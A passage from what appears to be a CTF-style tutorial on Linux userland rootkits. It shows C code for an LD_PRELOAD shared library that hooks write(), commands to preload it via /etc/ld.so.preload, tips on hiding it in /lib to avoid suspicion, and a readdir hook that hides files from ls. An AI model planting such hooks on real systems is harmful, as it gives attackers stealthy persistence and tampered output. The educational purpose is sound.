libraries.</p><h3 class="relative group">2.1<div id=21 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#21 aria-label=Anchor>#</a></span></h3><p>What is the name of the dynamic linker/loader on linux?</p><pre><code> ld.so, ld-linux.so
</code></pre><p><a href="https://linux.die.net/man/8/ld-linux#:~:text=Linux%20binaries%20require%20dynamic%20linking,so." target=_blank rel=noreferrer>man</a></p><hr><h2 class="relative group">Task 03: Getting A Tad Bit Technical<div id=task-03-getting-a-tad-bit-technical class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-03-getting-a-tad-bit-technical aria-label=Anchor>#</a></span></h2><p>This section will be a tad bit technical, so bear with me for a while. Take a break and have some coffee and once you are ready, head on:</p><p>So far we have learned that :</p><ol><li>When we execute a dynamically linked executable, it issues calls to certain standard functions which are predefined in shared libraries.</li><li>The system looks up the address of the function in the shared libraries.</li><li>The system returns the address of the first instance of the function as located in the shared library.</li><li>It then performs the required actions.</li></ol><p>Seems simple enough? Now let&rsquo;s get into the details. A large part of what&rsquo;s coming has been taken from the man page of ld.so, so it&rsquo;ll be helpful to have it handy.</p><p>With that out of the way, let&rsquo;s go on:</p><p>First, let&rsquo;s check the dynamically linked libraries needed by the ls command. To do this, you can type:</p><p><code># ldd which ls</code></p><p>Or if you are using fish shell then:</p><p><code># ldd (which ls)</code></p><p>Either way, it should give you an output similar to this:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ldd /bin/ls        </span>
</span></span><span class=line><span class=cl>linux-gate.so.1 <span class=o>(</span>0xb7f54000<span class=o>)</span>        
</span></span><span class=line><span class=cl>libselinux.so.1 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span class=o>(</span>0xb7ed7000<span class=o>)</span>        
</span></span><span class=line><span class=cl>libc.so.6 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class=o>(</span>0xb7cf9000<span class=o>)</span>         
</span></span><span class=line><span class=cl>libdl.so.2 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span class=o>(</span>0xb7cf3000<span class=o>)</span>
</span></span><span class=line><span class=cl>libpcre.so.3 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span class=o>(</span>0xb7c7a000<span class=o>)</span>
</span></span><span class=line><span class=cl>/lib/ld-linux.so.2 <span class=o>(</span>0xb7f56000<span class=o>)</span>
</span></span><span class=line><span class=cl>libpthread.so.0 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span class=o>(</span>0xb7c59000<span class=o>)</span></span></span></code></pre></div></div><p>Note: This example was taken from an x86 Kali System, on a 64-bit system we will have different locations and libraries.</p><p>Here, we find a library with the soname <code>libc.so.6</code> which is located at <code>/lib/i386-linux-gnu/libc.so.6</code>.
Note: These are just symbolic links to the real shared library files located somewhere else in the system.</p><p>Our main objective here is to understand how the system&rsquo;s dynamic linker loads these dynamic libraries during launching a program. For this, we will heavily refer to the <code>ld.so man page</code>.</p><p>In the man page, we find the following texts:</p><ul><li>Using the directories specified in the DT_RPATH dynamic section attribute of the binary if present and DT_RUNPATH attribute does not exist. Use of DT_RPATH is deprecated.</li><li>Using the environment variable LD_LIBRARY_PATH, unless the executable is being run in secure-execution mode (see below), in which case this variable is ignored.</li><li>Using the directories specified in the DT_RUNPATH dynamic section attribute of the binary if present. Such directories are searched only to find those objects required by DT_NEEDED (direct dependencies) entries and do not apply to those objects&rsquo; children, which must themselves have their own DT_RUNPATH entries. This is unlike DT_RPATH, which is applied to searches for all children in the dependency tree.</li><li>From the cache file /etc/ld.so.cache, which contains a compiled list of candidate shared objects previously found in the augmented library path. If, however, the binary was linked with the -z nodeflib linker option, shared objects in the default paths are skipped. Shared objects installed in hardware capability directories (see below) are preferred to other shared objects.</li><li>In the default path /lib, and then /usr/lib. (On some 64-bit architectures, the default paths for 64-bit shared objects are /lib64, and then /usr/lib64.) If the binary was linked with the -z nodeflib linker option, this step is skipped.</li></ul><p>Yes, this part might be a tad bit complicated, don&rsquo;t sweat over it. Just know that there are some Environment Variables and System Paths where the dynamic linker looks for these shared libraries while running programs.</p><p>The part which interests us lies a bit below under the LD_PRELOAD section. I encourage everyone to read the entire section (it&rsquo;s relatively short as well). The part which we should be paying attention to are the bullet points at the end of the section (especially the first and last ones) :</p><pre><code> (1) The LD_PRELOAD environment variable.
 (2) The --preload command-line option when invoking the dynamic linker directly.
 (3) The /etc/ld.so.preload file
</code></pre><p>We are more interested in points (1) and (3) as they let us specify our own shared objects which are loaded BEFORE other shared libraries, and much like similar PATH hijacking attacks, we are going to use these to create our very own malicious shared libraries!</p><h3 class="relative group">3.1<div id=31 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#31 aria-label=Anchor>#</a></span></h3><p>What environment variable let&rsquo;s you load your own shared library before all others?</p><pre><code> LD_PRELOAD
</code></pre><h3 class="relative group">3.2<div id=32 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#32 aria-label=Anchor>#</a></span></h3><p>Which file contains a whitespace-separated list of ELF shared objects to be loaded before running a program?</p><pre><code> /etc/ld.so.preload
</code></pre><h3 class="relative group">3.3<div id=33 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#33 aria-label=Anchor>#</a></span></h3><p>If both the environment variable and the file are employed, the libraries specified by which would be loaded first?</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/WvXfE8k.png></figure>&mdash;</p><h2 class="relative group">Task 04: Putting On Our Coding Hats<div id=task-04-putting-on-our-coding-hats class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-04-putting-on-our-coding-hats aria-label=Anchor>#</a></span></h2><p>Enough about the theory, time to get our hands dirty. So put your coding hats on and continue reading below:</p><p>Before we start, we need to understand how things work. In this first example, we will hook the <code>write()</code> function. First let&rsquo;s create a very simple program using <code>write()</code> :</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
</span></span><span class=line><span class=cl>int main<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  char str<span class=o>[</span>12<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  int s<span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>s</span><span class=o>=</span>read<span class=o>(</span>0, str,13<span class=o>)</span><span class=p>;</span>      
</span></span><span class=line><span class=cl>  write<span class=o>(</span>1, str, s<span class=o>)</span><span class=p>;</span>                          
</span></span><span class=line><span class=cl>  <span class=k>return</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span></span></span></code></pre></div></div><p>First things first, let&rsquo;s compile and run our example to get an output as shown:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/HlUwm67.png></figure><p>Here, we basically read some input from stdin and print it out to stdout. Pretty simple, right ? (Let&rsquo;s just ignore the bad memory management). Now, let&rsquo;s take a look at what goes on behind the scenes:</p><p>Under normal circumstances, when the dynamic linker comes across the <code>write()</code> function, it looks up its address in the standard shared libraries. On encountering the first occurrence of <code>write()</code>, it passes the arguments to the function and return an output accordingly. Simple enough, right? Now it&rsquo;s time to get malicious.</p><p>First let&rsquo;s create a little malicious Shared Library of our own. Since we are hooking the <code>write()</code> function, first look up the full function definition and the return type from the man pages.</p><p>From the man pages we get the function definition of <code>write()</code> as <code>ssize_t write(int fd, const void *buf, size_t count);</code> with the return type being <code>ssize_t</code>.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/7GroQ8K.png></figure><p>It is very important that our malicious function also has the same function definition and return type as the original function which we are trying to hook. With that out of the way, let&rsquo;s get to writing our own malicious shared library as follows:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>write</span><span class=p>(</span><span class=kt>int</span> <span class=n>fildes</span><span class=p>,</span> <span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>nbytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=kt>ssize_t</span> <span class=p>(</span><span class=o>*</span><span class=n>new_write</span><span class=p>)(</span><span class=kt>int</span> <span class=n>fildes</span><span class=p>,</span> <span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>nbytes</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>     <span class=kt>ssize_t</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=n>new_write</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;write&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>     <span class=k>if</span> <span class=p>(</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=s>&#34;Hello World&#34;</span><span class=p>,</span><span class=nf>strlen</span><span class=p>(</span><span class=s>&#34;Hello World&#34;</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>     <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>result</span> <span class=o>=</span> <span class=nf>new_write</span><span class=p>(</span><span class=n>fildes</span><span class=p>,</span> <span class=s>&#34;Hacked 1337&#34;</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=s>&#34;Hacked 1337&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl>     <span class=k>else</span>
</span></span><span class=line><span class=cl>     <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>result</span> <span class=o>=</span> <span class=nf>new_write</span><span class=p>(</span><span class=n>fildes</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>nbytes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl>     <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>Looks complicated, does it? Trust me, it&rsquo;s not. Let&rsquo;s break this down:</p><ul><li><p>First, we include the necessary header files which we will need to carry out simple tasks. Pretty standard thing, right?</p></li><li><p>Next, we need to create a function with the exact same function definition and return type as the function we are trying to hook. This is because the programs calling the function will send a set of parameters and shall expect a particular type of output in return, failing to align to which will cause unwanted errors.</p><p>Since we are trying to hook the function here, we create a function with the same name(<code>write()</code>), set of parameters (int fd, const void *buf, size_t count) and return type (<code>ssize_t</code>) to prevent any unwanted errors. So far so good, right?</p></li><li><p>Next up, we do something VERY important : create a function pointer <code>new_write</code> with the same set of variables as the function we are trying to hook, which in this case is <code>write()</code>, as this will later store the original address of the function which we will use later! Got it?</p></li><li><p>We also create a variable <code>result</code> to store the return value. Do note that it&rsquo;s the same datatype as the calling program is expecting.</p></li><li><p>Finally, we come to probably the most technical part of the program. Here we are storing the location of the original <code>write()</code> function into the function pointer we created earlier. We use the <code>dlsym</code> function to get the address of next occurrence of <code>write</code> from the standard shared libraries (as dictated by the <code>RTLD_NEXT</code> flag). I will implore you to just skim through the man page for <code>dlsym</code> once before proceeding to get a better understanding of what&rsquo;s happening.</p></li></ul><p>The steps so far were pretty standard in all cases except for the usual change of names and parameters. The following steps dictate how we will be leveraging our hook and will be different for different hooks.</p><ul><li>Now we have some fun. Here, we compare the string buffer passed to the function to see if it equals &ldquo;Hello World&rdquo;. If it does, we call the original <code>write()</code> function using the function pointer but replace it with our own string and store the result returned. You can do anything you feel like : generate logs, trigger other conditions, create connections if certain conditions are met and so on. Feel free to play around this part!</li><li>If the conditions aren&rsquo;t met, however, we simply pass all the parameters to the original function via our function pointer, and store the result.</li><li>We finally return the result to the calling function.</li></ul><p>Phew, that was easy. Wasn&rsquo;t it? Take a moment, read through it if you didn&rsquo;t get any part of it but make sure you understand the steps as this is the core skeletal structure of a hook. Just to prevent this section from getting tedious, we&rsquo;ll see how to compile and load our malicious shared library in the next task.</p><h3 class="relative group">4.1<div id=41 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#41 aria-label=Anchor>#</a></span></h3><p>How many arguments does write() take?</p><pre><code> 3
</code></pre><blockquote><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p></blockquote><h3 class="relative group">4.2<div id=42 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#42 aria-label=Anchor>#</a></span></h3><p>Which feature test macro must be defined in order to obtain the definitions of RTLD_NEXT from &lt;dlfcn.h></p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/vQmROWz.png></figure>&mdash;</p><h2 class="relative group">Task 05: Let&rsquo;s Gooooooooo<div id=task-05-lets-gooooooooo class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-05-lets-gooooooooo aria-label=Anchor>#</a></span></h2><p>Okay, so the last section might have been a bit draining, but I promise this section will be fun. Here we will see how to:</p><ul><li>Compile Our Program</li><li>Pre-load Our Shared Object</li><li>See It In Action</li></ul><p>With the roadmap set, let&rsquo;s get going!</p><h3 class="relative group">Compiling Our Program<div id=compiling-our-program class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#compiling-our-program aria-label=Anchor>#</a></span></h3><p>To compile our program from the previous task, we will use the following:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>gcc -ldl malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so</span></span></code></pre></div></div><p><strong>Note : If you run into a <code>symbol lookup error</code> at any point, try the following compile statement:</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl</span></span></code></pre></div></div><p>Like always, let&rsquo;s break down the statement to make sure that we understand all of this:</p><ul><li>gcc : Our very own GNU Compiler Collection</li><li>-ldl : Link against libdl aka the dynamic linking library</li><li>malicious.c : The name of our program</li><li>-fPIC : Generate position-independent code. (Excellent answer on why this is needed can be found <a href=https://stackoverflow.com/questions/966960/what-does-fpic-mean-when-building-a-shared-library target=_blank rel=noreferrer>here</a>)</li><li>-shared : Tells the compiler to create a Shared Object which can be linked with other objects to produce an executable.</li><li>-D_GNU_SOURCE : It is specified to satisfy #ifdef conditions that allow us to use the RTLD_NEXT enum (Yes, this is what I was talking about in Question #2 of Task 4) . Optionally this flag can be replaced by adding <code>#define _GNU_SOURCE</code>.</li><li>-o : Specify the name of the output executable.</li><li>malicious.so : Name of output file</li></ul><p>With this done, we should have a <code>malicious.so</code> object file ready to hook a function, just waiting to be pre-loaded!</p><h3 class="relative group">Pre-Loading Our Shared Object<div id=pre-loading-our-shared-object class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#pre-loading-our-shared-object aria-label=Anchor>#</a></span></h3><p>Now that we have our Shared Object file ready, we need to pre-load it before other shared library objects to successfully hook our function. To do this, we have two methods to do this:</p><ul><li>Using LD_PRELOAD</li><li>Using /etc/ld.so.preload file</li></ul><p>If you have been following along, you know that if both are specified, then the libraries specified by LD_PRELOAD are loaded first Both the methods have their pros and cons depending on the situation, but I personally prefer the latter because we can easily hide the /etc/ld.so.preload file using this very same method (explained in a later Task) and not the dot-before-filename way. Below is the syntax for pre-loading the shared object using each method:</p><p><strong>Using LD_PRELOAD:</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>LD_PRELOAD</span><span class=o>=</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>/malicious.so</span></span></code></pre></div></div><p><strong>Using /etc/ld.so.preload:</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo sh -c <span class=s2>&#34;echo </span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>/malicious.so &gt; /etc/ld.so.preload&#34;</span></span></span></code></pre></div></div><p><em>Note : Both of these commands must be run from the directory containing the shared object file. Ideally, you would want to store them somewhere like /lib or /usr/lib depending on where your system stores the shared library object files so as not to arouse suspicion.</em></p><p>You can verify if your shared object was successfully loaded by doing a simple:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ldd /bin/ls
</span></span><span class=line><span class=cl>     linux-gate.so.1 <span class=o>(</span>0xb7fc0000<span class=o>)</span>
</span></span><span class=line><span class=cl>     /home/whokilleddb/malicious.so  <span class=o>(</span>0xb7f8f000<span class=o>)</span>
</span></span><span class=line><span class=cl>     libselinux.so.1 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span class=o>(</span>0xb7f43000<span class=o>)</span>
</span></span><span class=line><span class=cl>     libc.so.6 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class=o>(</span>0xb7d65000<span class=o>)</span>
</span></span><span class=line><span class=cl>     lbdl.so.2 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span class=o>(</span>0xb7d5f000<span class=o>)</span>
</span></span><span class=line><span class=cl>     libpcre.so.3 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span class=o>(</span>0xb7ce6000<span class=o>)</span>
</span></span><span class=line><span class=cl>     /lib/ld-linux.so.2 <span class=o>(</span>0xb7fc2000<span class=o>)</span>
</span></span><span class=line><span class=cl>     libpthread.so.0 <span class=o>=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span class=o>(</span>0xb7cc5000<span class=o>)</span></span></span></code></pre></div></div><p>[Awesome Explanation about that first linux-gate.so.1 library <a href=https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html target=_blank rel=noreferrer>here</a>]</p><p>The important thing to notice is that our malicious shared object is being loaded before the standard shared libraries.</p><p>So now the scenario is something like this: The program makes a call to the write() function with all the parameters in place. However, instead of going to the libc definition of write() it goes to our malicious shared object as the dynamic linker finds the FIRST OCCURRENCE of write() and lets it do its thing, which in our case is a simple comparison operation which, if true, returns the malicious/tampered output, else passes on the parameters onto the real function inside libc and passes the output obtained back to the program.</p><p>Pretty straight forward, right ? This process is roughly similar to the PATH Hijacking method which is widely used during CTFs and Pentests, so if you understand that well, this should be a breeze for you.</p><p>Finally, we can move to our final stage, which is seeing our malicious shared object in action!</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/cS21UEX.png></figure><h3 class="relative group">Seeing It In Action<div id=seeing-it-in-action class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#seeing-it-in-action aria-label=Anchor>#</a></span></h3><p>Remember the little &ldquo;Hello World&rdquo; Program we created ? Let&rsquo;s re-run it now with our malicious shared object pre-loaded and ready ! If we run it this time we will see something fun. Instead of the &ldquo;Hello World&rdquo; string being echoed back, we will see &ldquo;Hacked 1337&rdquo;, courtesy of our malicious shared object.</p><p>But does it stop there? NO. Manyyyyyyyyyyyyy other programs (as obvious by the excess trailing &lsquo;y&rsquo;s) use libc to do their work for them. write() is a very common functionality and is frequently invoked. This will affect all such programs.</p><p>For example, if you create a file with the text &ldquo;Hello World&rdquo; and try to cat it out, we will get &ldquo;Hacked 1337&rdquo; as output. Same results will follow if we used python3 to print the same because at some level, they all are using the write() function which has already been hooked. So now you can imagine the wide array of things you can achieve with hooking functions instead of just swapping text.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/iMXZTMG.png></figure><p><em>Note: Make sure that the string you are replacing and the string you are replacing it with have the same number of characters to prevent memory flaws</em></p><p>So that was all about hooking the write() function. Though we did not play around with the function much, but it is to be noted that this can be used to trigger a lot of other events. For example many services use the write() function to generate logs and if we are able to trigger a switch (for example by passing &ldquo;Hello World&rdquo; or some other switch as a username or in the User Agent of a request, which will then be passed as an argument to write() at some point), we can spawn reverse/bind shells, delete files, exfiltrate data, etc.</p><h3 class="relative group">5.1<div id=51 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#51 aria-label=Anchor>#</a></span></h3><p>When compiling our code to produce a Shared Object, which flag is used to create position independent code?</p><pre><code> -fPIC
</code></pre><h3 class="relative group">5.2<div id=52 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#52 aria-label=Anchor>#</a></span></h3><p>Can hooking libc functions affect the behavior of Python3? (Yay/Nay)</p><pre><code> yay---
</code></pre><h2 class="relative group">task 06: Hiding Files From ls<div id=task-06-hiding-files-from-ls class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#task-06-hiding-files-from-ls aria-label=Anchor>#</a></span></h2><p>Now that we know how to use Shared Objects to hook various functions, let&rsquo;s learn how to hide files from the <code>ls</code> command in a more efficient way than just putting-a-dot-before-filename.</p><p>Before we attack the ls command, we need to understand how it actually works. I will not go into details of the entire thing here (people are getting angry at the long tasks) but <a href=https://gist.github.com/amitsaha/8169242 target=_blank rel=noreferrer>here&rsquo;s an excellent resource</a> to understand the command, and it&rsquo;s workings in depth.</p><p>The primary thing which we need to know here that the command uses a function called readdir() which returns a pointer to the next dirent structure in the directory. A dirent is a C - structure who&rsquo;s glibc definition can be obtained from the man page of readdir:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=kt>ino_t</span>          <span class=n>d_ino</span><span class=p>;</span>       <span class=cm>/* Inode number */</span>
</span></span><span class=line><span class=cl>     <span class=kt>off_t</span>          <span class=n>d_off</span><span class=p>;</span>       <span class=cm>/* Not an offset; see below */</span>
</span></span><span class=line><span class=cl>     <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>d_reclen</span><span class=p>;</span>    <span class=cm>/* Length of this record */</span>
</span></span><span class=line><span class=cl>     <span class=kt>unsigned</span> <span class=kt>char</span>  <span class=n>d_type</span><span class=p>;</span>      <span class=cm>/* Type of file; not supported not supported by all filesystem types */</span>  
</span></span><span class=line><span class=cl>     <span class=kt>char</span>           <span class=n>d_name</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span> <span class=cm>/* Null-terminated filename */</span>
</span></span><span class=line><span class=cl>     <span class=p>};</span></span></span></code></pre></div></div><p>The main parameter which we are concerned about here is the <code>d_name[256]</code> which is a mandatory field and contains the name of the various files in our a directory. (See where I am going with this ?)</p><p>So here&rsquo;s the roadmap:</p><ul><li><code>ls</code> uses <code>readdir()</code> function to get the contents of a directory</li><li>The <code>readdir()</code> function returns a pointer to a dirent structure to the next directory entry</li><li>The <code>dirent</code> structure contains a d_name parameter which contains the name of the file</li><li>Thus, we hook the <code>readdir()</code> function</li><li>Then we pass the parameters to the original function and check whether the <code>d_name</code> parameter of the <code>dirent</code> whose pointer is being returned is equal to a given a filename</li><li>If yes, we skip it and pass on the rest.</li></ul><p>With the map all set, let&rsquo;s get to coding!</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dirent.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define FILENAME &#34;ld.so.preload&#34;
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=nf>readdir</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>old_readdir</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dir</span><span class=p>);</span>     
</span></span><span class=line><span class=cl>     <span class=n>old_readdir</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>     <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=k>while</span> <span class=p>(</span><span class=n>dir</span> <span class=o>=</span> <span class=nf>old_readdir</span><span class=p>(</span><span class=n>dirp</span><span class=p>))</span>
</span></span><span class=line><span class=cl>     <span class=p>{</span>
</span></span><span class=line><span class=cl>           <span class=k>if</span><span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>dir</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span><span class=n>FILENAME</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>     
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl>     <span class=k>return</span> <span class=n>dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=nf>readdir64</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>old_readdir64</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dir</span><span class=p>);</span>     
</span></span><span class=line><span class=cl>     <span class=n>old_readdir64</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir64&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>     <span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=n>dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=k>while</span> <span class=p>(</span><span class=n>dir</span> <span class=o>=</span> <span class=nf>old_readdir64</span><span class=p>(</span><span class=n>dirp</span><span class=p>))</span>
</span></span><span class=line><span class=cl>     <span class=p>{</span>
